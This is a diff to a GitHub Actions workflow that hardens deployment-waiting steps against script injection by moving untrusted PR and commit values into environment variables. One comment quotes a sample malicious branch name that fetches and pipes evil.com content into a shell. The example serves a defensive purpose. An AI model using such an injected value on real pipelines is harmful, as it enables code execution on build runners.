@@ -46,21 +46,38 @@ jobs:
 
       - name: Resolve target SHA
         id: sha
+        # User-controlled inputs (notably PR_HEAD_REF, which can be
+        # any string an attacker chooses when opening a PR from a
+        # fork) are routed through env vars rather than interpolated
+        # directly into the shell script. GHA expression substitution
+        # happens before the shell sees the script, so a malicious
+        # branch name like `"; curl evil.com | sh; #` would become
+        # live shell syntax if templated directly. Environment
+        # variables aren't re-parsed by the shell, so accessing them
+        # via `$PR_HEAD_REF` is safe.
+        # See: https://securitylab.github.com/resources/github-actions-untrusted-input/
         env:
           GH_TOKEN: ${{ github.token }}
+          EVENT_NAME: ${{ github.event_name }}
+          GH_REPOSITORY: ${{ github.repository }}
+          GITHUB_REF: ${{ github.ref }}
+          GITHUB_SHA: ${{ github.sha }}
+          PR_HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}
+          PR_NUMBER: ${{ github.event.pull_request.number }}
         run: |
           echo "Resolving target commit for this run..."
-          case "${{ github.event_name }}" in
+          case "$EVENT_NAME" in
             pull_request)
-              SHA="${{ github.event.pull_request.head.sha }}"
-              CONTEXT="PR #${{ github.event.pull_request.number }} (branch '${{ github.event.pull_request.head.ref }}')"
+              SHA="$PR_HEAD_SHA"
+              CONTEXT="PR #${PR_NUMBER} (branch '${PR_HEAD_REF}')"
               ;;
             push|workflow_dispatch)
-              SHA="${{ github.sha }}"
-              CONTEXT="${{ github.event_name }} on ${{ github.ref }}"
+              SHA="$GITHUB_SHA"
+              CONTEXT="$EVENT_NAME on $GITHUB_REF"
               ;;
             *)
-              echo "::error::Unexpected event: ${{ github.event_name }}"
+              echo "::error::Unexpected event: $EVENT_NAME"
               exit 1
               ;;
           esac
@@ -69,12 +86,12 @@ jobs:
           # extra checkout history. Falls back to just the short SHA if
           # the API call fails for any reason.
           SUMMARY=$(
-            gh api "repos/${{ github.repository }}/commits/$SHA" \
+            gh api "repos/${GH_REPOSITORY}/commits/${SHA}" \
               --jq '(.sha[:12]) + " " + (.commit.message | split("\n")[0])' 2>/dev/null \
               || echo "${SHA:0:12}"
           )
 
-          echo "  Event:   ${{ github.event_name }}"
+          echo "  Event:   $EVENT_NAME"
           echo "  Context: $CONTEXT"
           echo "  Target:  $SUMMARY"
 
@@ -130,8 +147,14 @@ jobs:
         # for knowing the Railway env is already up.
         if: github.event_name != 'workflow_dispatch'
         id: wait-deploy
+        # Every GHA expression substitution is routed through an env
+        # var rather than interpolated directly into the shell script
+        # — see the comment on Resolve target SHA above. The SUMMARY
+        # variable specifically matters because it's derived from a
+        # commit message (user-controlled content).
         env:
           GH_TOKEN: ${{ github.token }}
+          GH_REPOSITORY: ${{ github.repository }}
           SHA: ${{ steps.sha.outputs.sha }}
           SUMMARY: ${{ steps.sha.outputs.summary }}
           # Only set on pull_request — unused on push.
@@ -169,7 +192,7 @@ jobs:
               # "-<PR number>". Covers both "ePDS / ePDS-pr-55" and
               # the collision-avoidance form "ePDS / pr-3897f1-55".
               SHA_FILTER=".creator.login == \"railway-app[bot]\" and .transient_environment == true and (.environment | endswith(\"-$PR_NUMBER\"))"
-              FALLBACK_URL="repos/${{ github.repository }}/deployments?per_page=100"
+              FALLBACK_URL="repos/${GH_REPOSITORY}/deployments?per_page=100"
               FALLBACK_FILTER="$SHA_FILTER"
               TARGET_DESC="PR #$PR_NUMBER preview"
               ;;
@@ -177,7 +200,7 @@ jobs:
               # Persistent pr-base env. The `environment` query parameter
               # is an exact-match filter — efficient server-side.
               SHA_FILTER='.creator.login == "railway-app[bot]" and .environment == "ePDS / pr-base"'
-              FALLBACK_URL="repos/${{ github.repository }}/deployments?environment=ePDS%20%2F%20pr-base&per_page=10"
+              FALLBACK_URL="repos/${GH_REPOSITORY}/deployments?environment=ePDS%20%2F%20pr-base&per_page=10"
               FALLBACK_FILTER='.creator.login == "railway-app[bot]"'
               TARGET_DESC="pr-base env"
               ;;
@@ -189,7 +212,7 @@ jobs:
           echo "  Environment: $TARGET_DESC"
 
           find_deploy_for_sha() {
-            gh api "repos/${{ github.repository }}/deployments?sha=$SHA" \
+            gh api "repos/${GH_REPOSITORY}/deployments?sha=$SHA" \
               --jq "map(select($SHA_FILTER))[0]"
           }
 
@@ -200,13 +223,13 @@ jobs:
 
           latest_state_of() {
             local id=$1
-            gh api "repos/${{ github.repository }}/deployments/$id/statuses" \
+            gh api "repos/${GH_REPOSITORY}/deployments/$id/statuses" \
               --jq '.[0].state // "pending"'
           }
 
           describe_sha() {
             local sha=$1
-            gh api "repos/${{ github.repository }}/commits/$sha" \
+            gh api "repos/${GH_REPOSITORY}/commits/$sha" \
               --jq '(.sha[:12]) + " " + (.commit.message | split("\n")[0])' 2>/dev/null \
               || echo "${sha:0:12}"
           }
@@ -422,6 +445,14 @@ jobs:
           } >> "$GITHUB_OUTPUT"
 
       - name: Wait for all services
+        # URLs routed via env even though they're derived from a
+        # strictly-validated slug regex upstream, matching the general
+        # policy of never interpolating ${{ }} into run-block scripts.
+        env:
+          EPDS_URL: ${{ steps.urls.outputs.epds_url }}
+          AUTH_URL: ${{ steps.urls.outputs.auth_url }}
+          DEMO_URL: ${{ steps.urls.outputs.demo_url }}
+          MAILPIT_URL: ${{ steps.urls.outputs.mailpit_url }}
         run: |
           echo "Health-checking 4 Railway services (5 minutes per service)..."
 
@@ -443,10 +474,10 @@ jobs:
             echo "::error::$LABEL ($URL) timed out after 5 minutes"
             exit 1
           }
-          check "PDS"     "${{ steps.urls.outputs.epds_url }}/health"
-          check "Auth"    "${{ steps.urls.outputs.auth_url }}/health"
-          check "Demo"    "${{ steps.urls.outputs.demo_url }}"
-          check "Mailpit" "${{ steps.urls.outputs.mailpit_url }}/readyz"
+          check "PDS"     "${EPDS_URL}/health"
+          check "Auth"    "${AUTH_URL}/health"
+          check "Demo"    "${DEMO_URL}"
+          check "Mailpit" "${MAILPIT_URL}/readyz"
 
           echo
           echo "All 4 services reachable."
